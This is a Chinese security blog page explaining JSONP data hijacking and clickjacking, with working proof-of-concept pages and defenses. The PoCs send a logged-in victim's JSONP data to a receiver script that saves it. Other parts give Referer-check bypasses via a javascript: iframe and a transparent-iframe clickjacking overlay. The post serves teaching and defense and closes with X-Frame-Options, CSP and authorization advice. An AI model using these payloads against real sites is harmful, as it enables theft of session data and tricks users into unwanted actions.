@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<link rel="stylesheet" href="/css/custom.css"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>JSONP 点击劫持 / 点击劫持 漏洞详解与防护</title><meta charset="utf-8"><meta name="description" content="Ladder@介绍 JSONP 点击劫持漏洞原理、POC、绕过方法，以及点击劫持的演示与防护（X-Frame-Options、SameSite）。"><meta name="author" content="hzhsec">
+<link rel="canonical" href="https://hzhsec.github.io/list/base_bug/xss/xss6/"><meta property="og:title" content="JSONP 点击劫持 / 点击劫持 漏洞详解与防护" /><meta property="og:description" content="介绍 JSONP 点击劫持漏洞原理、POC、绕过方法，以及点击劫持的演示与防护（X-Frame-Options、SameSite）。" />
+<meta property="og:type" content="article" /><meta property="og:url" content="https://hzhsec.github.io/list/base_bug/xss/xss6/" />
+<meta property="article:section" content="list" /><meta property="article:published_time" content="2025-10-16T17:15:00+08:00" /><meta property="article:modified_time" content="2025-10-16T17:15:00+08:00" /><meta name="twitter:card" content="summary"/><meta name="twitter:title" content="JSONP 点击劫持 / 点击劫持 漏洞详解与防护"/><meta name="twitter:description" content="介绍 JSONP 点击劫持漏洞原理、POC、绕过方法，以及点击劫持的演示与防护（X-Frame-Options、SameSite）。"/>
+<link rel="icon" href="/static/hzhsec.png" sizes="16x16"><link rel="apple-touch-icon" href="/static/hzhsec.png"><link rel="manifest" href="/static/hzhsec.png">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.7.0/style.css" />
+<link rel="stylesheet" href="/css/main.min.ec28f09e946fc0df77c187fcd0d0ebde58fca6de8efb8e1620f3d45c32d4da88.css" crossorigin="anonymous" media="screen" />
+<link rel="stylesheet" href="/scss/highlight/github-dark.min.min.66034289ee9a113219a2c4aae0a8bd2095ab255c832a42efcf5863f10814e7a1.css" />
+<script src="/js/highlight.min.min.c098d85b5396dec4707ea2cead1445b4dc2ff0fc56b8dbbd9049d0d1c50ad237.js"></script><script>hljs.highlightAll();</script>
+<script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script></head>
+<body><main class="wrapper"><nav class="navigation"><section class="container"><a class="navigation-brand" href="/">主页</a><input type="checkbox" id="menu-toggle" />
+<label class="menu-button float-right" for="menu-toggle"><span></span><span></span><span></span></label><ul class="navigation-list" id="navigation-list">
+<li class="navigation-item navigation-menu"><a class="navigation-link" href="/list/">目录</a></li><li class="navigation-item navigation-menu"><a class="navigation-link" href="/archives/">归档</a></li>
+<li class="navigation-item navigation-menu"><a class="navigation-link" href="/message/">关于</a></li><li class="navigation-item navigation-menu"><a class="navigation-link" href="/categories/">分类</a></li>
+<li class="navigation-item navigation-menu"><a class="navigation-link" href="https://umami-evtq.vercel.app/share/NdRAzdY1AwLB5KF2/hzhsec.github.io">网站统计</a></li><li class="navigation-item menu-separator"><span>|</span></li>
+<li class="navigation-item navigation-social"><a class="navigation-link" href="https://github.com/hzhsec">GitHub</a></li><li class="navigation-item navigation-social"><a class="navigation-link" href="/message/">Mail</a></li></ul></section></nav>
+<div id="content"><article class="blog-single"><header class="blog-title"><h1>JSONP 点击劫持 / 点击劫持 漏洞详解与防护</h1></header><p><small>October 16, 2025&nbsp;· 1424 words&nbsp;· 8 min</small><p><details class="blog-toc" open><summary>Contents</summary><nav id="TableOfContents"><ul><li class="toc-item toc-depth-1"><details class="toc-branch toc-depth-1"><summary><a class="toc-link" href="#jsonp-点击劫持漏洞">JSONP 点击劫持漏洞</a></summary><div class="toc-children"><ul><li class="toc-item toc-depth-2"><a class="toc-link" href="#漏洞原理与利用流程">漏洞原理与利用流程</a></li><li class="toc-item toc-depth-2"><a class="toc-link" href="#演示-demo后端模拟接口">演示 Demo（后端模拟接口）</a></li><li class="toc-item toc-depth-2"><a class="toc-link" href="#poc恶意页面示例">PoC（恶意页面示例）</a></li><li class="toc-item toc-depth-2"><a class="toc-link" href="#常用-payload万能-poc">常用 Payload（万能 PoC）</a></li><li class="toc-item toc-depth-2"><details class="toc-branch toc-depth-2"><summary><a class="toc-link" href="#jsonp-绕过技巧">JSONP 绕过技巧</a></summary><div class="toc-children"><ul><li class="toc-item toc-depth-3"><a class="toc-link" href="#绕过-referer-检测">绕过 Referer 检测</a></li><li class="toc-item toc-depth-3"><a class="toc-link" href="#jsonp-导致-xss-的条件">JSONP 导致 XSS 的条件</a></li></ul></div></details></li></ul></div></details></li><li class="toc-item toc-depth-1"><details class="toc-branch toc-depth-1"><summary><a class="toc-link" href="#点击劫持漏洞clickjacking">点击劫持漏洞（Clickjacking）</a></summary><div class="toc-children"><ul><li class="toc-item toc-depth-2"><a class="toc-link" href="#点击劫持-poc">点击劫持 PoC</a></li><li class="toc-item toc-depth-2"><details class="toc-branch toc-depth-2"><summary><a class="toc-link" href="#防护抗点击劫持">防护（抗点击劫持）</a></summary><div class="toc-children"><ul><li class="toc-item toc-depth-3"><a class="toc-link" href="#使用-x-frame-options-响应头">使用 X-Frame-Options 响应头</a></li><li class="toc-item toc-depth-3"><a class="toc-link" href="#使用-csp-的-frame-ancestors-指令">使用 CSP 的 frame-ancestors 指令</a></li><li class="toc-item toc-depth-3"><a class="toc-link" href="#其他补充措施">其他补充措施</a></li></ul></div></details></li><li class="toc-item toc-depth-2"><a class="toc-link" href="#合规与建议">合规与建议</a></li></ul></div></details></li></ul></nav></details><section class="blog-content"><p>JSONP（JSON with Padding）是一种用于解决跨域数据请求的变通方案，核心原理是<strong>利用 <code>&lt;script&gt;</code> 标签的跨域特性绕过同源策略</strong>。通过将返回内容包裹在回调函数中，使得数据以 JavaScript 的形式被执行。</p>
+<h1 id="jsonp-点击劫持漏洞">JSONP 点击劫持漏洞</h1>
+<p>JSONP（JSON with Padding）是一种用于解决跨域数据请求的变通方案，核心原理是<strong>利用 <code>&lt;script&gt;</code> 标签的跨域特性绕过同源策略</strong>。通过将返回内容包裹在回调函数中，使得数据以 JavaScript 的形式被执行。</p>
+<p>早期前后端分离尚不成熟时，这类接口设计比较常见，若后端在返回时直接把敏感数据通过回调函数输出并信任 <code>callback</code> 参数，就可能被攻击者利用来窃取登录用户的数据。</p>
+<hr/>
+<h2 id="漏洞原理与利用流程">漏洞原理与利用流程</h2>
+<ol>
+<li>找到返回敏感信息的 JSONP 接口（例如返回用户信息且依赖 session 登录态）。</li>
+<li>构造一个恶意页面 <code>jsonp.html</code>，在页面中通过 <code>&lt;script src="...callback=attackerFunction"&gt;</code> 加载目标接口。</li>
+<li>当登录用户访问该恶意页面时，目标接口会以 <code>attackerFunction({...})</code> 形式返回敏感数据，攻击者的 <code>attackerFunction</code> 会在页面中接收并外带这些数据到攻击者服务器。</li>
+</ol>
+<hr/>
+<h2 id="演示-demo后端模拟接口">演示 Demo（后端模拟接口）</h2>
+<p>示例接口：<code>http://test:8069/test.php</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">header</span>(<span style="color:#e6db74">'Content-type:application/json'</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$callback <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">'callback'</span>];
+</span></span><span style="display:flex;"><span>$name <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">'name'</span>]; <span style="color:#75715e">// 模拟 admin 的 session
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($name <span style="color:#f92672">==</span> <span style="color:#e6db74">'admin'</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> $callback<span style="color:#f92672">.</span><span style="color:#e6db74">"({'id':1,'name':'Sentiment','pwd':'123456','key':'88888'})"</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>当用户以 admin 登录并访问：<code>http://test:8069/test.php?callback=testme</code>，返回：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>testme({'id':1,'name':'Sentiment'})
+</span></span></code></pre></div><p>攻击者可以把这个返回结果在其页面中接收并外带敏感信息。</p>
+<hr/>
+<h2 id="poc恶意页面示例">PoC（恶意页面示例）</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">"en"</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">"UTF-8"</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">"viewport"</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">"width=device-width, initial-scale=1.0"</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">title</span>&gt;poc&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">"https://code.jquery.com/jquery-3.6.0.min.js"</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">testname</span>(<span style="color:#a6e22e">v</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">"json hack"</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">h</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">''</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">key</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">v</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">key</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">':'</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">v</span>[<span style="color:#a6e22e">key</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">' ,'</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">h</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">a</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">h</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 数据外带
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">'http://localhost:3000/js_xss/value.php?value='</span> <span style="color:#f92672">+</span> encodeURIComponent(<span style="color:#a6e22e">h</span>));
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- 访问目标 JSONP 接口并将回调绑定到 testname --&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">"http://127.0.0.1:3000/js_xss/test.php?callback=testname&amp;name=admin"</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>后端接收示例（PHP）可把接收到的数据写入文件：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>$value <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">'value'</span>];
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($value) {
+</span></span><span style="display:flex;"><span>    $file <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">'value.txt'</span>, <span style="color:#e6db74">'w+'</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($file) {
+</span></span><span style="display:flex;"><span>        $value <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_decode</span>($value);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fwrite</span>($file, $value);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fclose</span>($file);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">error_log</span>(<span style="color:#e6db74">"Failed to open file: value.txt"</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">error_log</span>(<span style="color:#e6db74">"No value parameter provided"</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><hr/>
+<h2 id="常用-payload万能-poc">常用 Payload（万能 PoC）</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">'en'</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">"referrer"</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">"never"</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">"utf-8"</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">title</span>&gt;jsonp&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">h1</span>&gt;万能poc&lt;/<span style="color:#f92672">h1</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">"text/javascript"</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">testname</span>(<span style="color:#a6e22e">data</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">hacker_data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">data</span>);
+</span></span><span style="display:flex;"><span>    document.<span style="color:#a6e22e">write</span>(<span style="color:#e6db74">"&lt;p&gt;"</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">hacker_data</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">"&lt;/p&gt;"</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">hacker_data</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xmlHttp</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">"http://localhost:3000/js_xss/value.php?value="</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">hacker_data</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xmlHttp</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">"GET"</span>, <span style="color:#a6e22e">url</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xmlHttp</span>.<span style="color:#a6e22e">send</span>(<span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">"http://127.0.0.1:3000/js_xss/test.php?callback=testname&amp;name=admin"</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><hr/>
+<h2 id="jsonp-绕过技巧">JSONP 绕过技巧</h2>
+<h3 id="绕过-referer-检测">绕过 Referer 检测</h3>
+<ul>
+<li>有些站点仅简单检查 Referer 中是否包含自身域名字段（如 <code>assc.com</code>），可以在恶意页面 URL 中加入该字段来绕过（<code>http://attack.com/1.html?a=assc.com</code>）。</li>
+<li>有时站点允许空 Referer，可利用 <code>iframe</code> 加载 <code>javascript:</code> 伪协议来发起无 Referer 请求：</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">"javascript:'&lt;script&gt;function testname(data){alert(JSON.stringify(data));}&lt;/script&gt;&lt;script src=http://127.0.0.1:3000/js_xss/test.php?callback=testname&amp;name=admin&gt;&lt;/script&gt;'"</span> <span style="color:#a6e22e">frameborder</span><span style="color:#f92672">=</span><span style="color:#e6db74">"0"</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
+</span></span></code></pre></div><p>工具： <a href="https://github.com/yuebusao/jsonp-burp-killer">https://github.com/yuebusao/jsonp-burp-killer</a></p>
+<h3 id="jsonp-导致-xss-的条件">JSONP 导致 XSS 的条件</h3>
+<ul>
+<li>当返回的 MIME 类型或处理方式使浏览器将响应当作可执行脚本（例如 <code>text/html</code>）时，且服务端直接把 <code>callback</code> 未做校验地拼接到输出中，可能导致反射型 XSS。</li>
+<li>PHP 默认 <code>Content-Type</code> 常为 <code>text/html</code>，在某些情况下需特别关注 PHP 后端的 JSONP 接口。</li>
+</ul>
+<hr/>
+<h1 id="点击劫持漏洞clickjacking">点击劫持漏洞（Clickjacking）</h1>
+<p>点击劫持是一种利用 UI 覆盖诱导用户误点击的攻击，攻击者在其页面上用透明或半透明的 <code>iframe</code> 嵌入目标页面，并在上面放置诱导点击的元素，使得用户以为在点击攻击者页面的按钮，实际上是在操作目标页面的敏感按钮（例如删除、授权、支付等）。</p>
+<hr/>
+<h2 id="点击劫持-poc">点击劫持 PoC</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE HTML&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">http-equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">"Content-Type"</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">"text/html; charset=utf-8"</span> /&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">title</span>&gt;点击劫持&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">style</span>&gt;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">html</span><span style="color:#f92672">,</span><span style="color:#f92672">body</span><span style="color:#f92672">,</span><span style="color:#f92672">iframe</span> { <span style="color:#66d9ef">display</span>:<span style="color:#66d9ef">block</span>; <span style="color:#66d9ef">height</span>:<span style="color:#ae81ff">100</span><span style="color:#66d9ef">%</span>; <span style="color:#66d9ef">width</span>:<span style="color:#ae81ff">100</span><span style="color:#66d9ef">%</span>; <span style="color:#66d9ef">margin</span>:<span style="color:#ae81ff">0</span>; <span style="color:#66d9ef">padding</span>:<span style="color:#ae81ff">0</span>; <span style="color:#66d9ef">border</span>:<span style="color:#66d9ef">none</span>; }
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">iframe</span> { <span style="color:#66d9ef">opacity</span>:<span style="color:#ae81ff">0.5</span>; <span style="color:#66d9ef">filter</span>:<span style="color:#a6e22e">alpha</span>(opacity<span style="color:#960050;background-color:#1e0010">=</span><span style="color:#ae81ff">0</span>); <span style="color:#66d9ef">position</span>:<span style="color:#66d9ef">absolute</span>; <span style="color:#66d9ef">z-index</span>:<span style="color:#ae81ff">2</span>; }
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">button</span> { <span style="color:#66d9ef">position</span>:<span style="color:#66d9ef">absolute</span>; <span style="color:#66d9ef">top</span>:<span style="color:#ae81ff">450</span><span style="color:#66d9ef">px</span>; <span style="color:#66d9ef">left</span>:<span style="color:#ae81ff">850</span><span style="color:#66d9ef">px</span>; <span style="color:#66d9ef">z-index</span>:<span style="color:#ae81ff">1</span>; <span style="color:#66d9ef">width</span>:<span style="color:#ae81ff">72</span><span style="color:#66d9ef">px</span>; <span style="color:#66d9ef">height</span>:<span style="color:#ae81ff">26</span><span style="color:#66d9ef">px</span>; }
+</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">style</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>  万万想不到
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">button</span>&gt;查看详情&lt;/<span style="color:#f92672">button</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">"https://www.baidu.com/p/9536743109"</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>注释：通过调整 <code>iframe</code> 的 <code>opacity</code>、按钮位置（<code>top</code>/<code>left</code>）及大小，可将按钮对准目标页面上的敏感操作按钮，诱导点击。</p>
+<hr/>
+<h2 id="防护抗点击劫持">防护（抗点击劫持）</h2>
+<p>最简单且常用的防护方式是禁止敏感页面被 <code>iframe</code> 嵌入，常见实现方式：</p>
+<h3 id="使用-x-frame-options-响应头">使用 X-Frame-Options 响应头</h3>
+<ul>
+<li><code>DENY</code>：禁止任何站点通过 iframe 嵌入该页面。</li>
+<li><code>SAMEORIGIN</code>：只允许同源页面通过 iframe 嵌入。</li>
+<li><code>ALLOW-FROM uri</code>：允许特定来源嵌入（部分浏览器兼容性问题）。</li>
+</ul>
+<p>示例（PHP）：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">header</span>(<span style="color:#e6db74">"X-Frame-Options: DENY"</span>);
+</span></span></code></pre></div><h3 id="使用-csp-的-frame-ancestors-指令">使用 CSP 的 frame-ancestors 指令</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Security-Policy: frame-ancestors 'self';
+</span></span></span></code></pre></div><h3 id="其他补充措施">其他补充措施</h3>
+<ul>
+<li>使用 <code>SameSite</code>（<code>Lax</code> 或 <code>Strict</code>）减少跨站请求携带 cookie，降低攻击成功率。</li>
+<li>对重要操作增加二次确认或验证码、使用 POST 验证来源、检测 Referer/Origin 并拒绝异常来源。</li>
+</ul>
+<hr/>
+<img alt="wx.png" src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/wx.png"/>
+<hr/>
+<h2 id="合规与建议">合规与建议</h2>
+<ul>
+<li>在进行此类测试或复现时，请先获取明确书面授权并限定测试范围/窗口。</li>
+<li>对发现的高危问题（如能外带凭据或导致敏感操作被触发）应立刻与目标方沟通并给出修复建议（例如添加 HttpOnly、设置 X-Frame-Options、限制 JSONP 回调白名单）。</li>
+</ul>
+<hr/></section><div class="paginator"><a class="prev" href="https://hzhsec.github.io/list/za_xiang/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8-git-%E6%8E%A8%E9%80%81-%E9%97%AE%E9%A2%98%E4%B8%8E%E8%A7%A3%E5%86%B3/"><small>← 上一篇</small><span>记一次云服务器Git推送问题与解决</span></a><a class="next" href="https://hzhsec.github.io/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/linux/3.nfs_path_cron%E6%8F%90%E6%9D%83/"><small>下一篇 →</small><span>NFS、PATH、Cron 任务提权总结与复现记录</span></a></div></article></div><footer class="footer"><p>&copy; 2026 <a href="https://hzhsec.github.io/">Hzhsec home</a> Powered by <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a> <a href="https://github.com/guangzhengli/hugo-theme-ladder" rel="noopener" target="_blank">Ladder</a></p></footer>
+<a href="#top" class="top-link" id="top-link" accesskey="g">Top</a><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){if(document.body.scrollTop>800||document.documentElement.scrollTop>800){mybutton.style.visibility="visible";mybutton.style.opacity="1";}else{mybutton.style.visibility="hidden";mybutton.style.opacity="0";}};</script>
+<script>document.querySelectorAll('pre > code').forEach((codeblock)=>{const copybutton=document.createElement('button');copybutton.classList.add('copy-code');copybutton.innerHTML='Copy';function done(){copybutton.innerHTML='Copied';setTimeout(()=>{copybutton.innerHTML='Copy';},2000);}copybutton.addEventListener('click',()=>{if('clipboard' in navigator){navigator.clipboard.writeText(codeblock.textContent);done();return;}const range=document.createRange();range.selectNodeContents(codeblock);const selection=window.getSelection();selection.removeAllRanges();selection.addRange(range);try{document.execCommand('copy');done();}catch(e){}selection.removeRange(range);});codeblock.parentNode.appendChild(copybutton);});</script></main></body>
+<script src="/main.min.6bb26b69159420159c74dc9e097b06a578ed2b68c701466a91a44a9632d851bd0af167a1b30012387b4c512b48ad9ad4d3394e04d77ae38d57e1920fe4ed34fe.js" crossorigin="anonymous" defer></script></html>
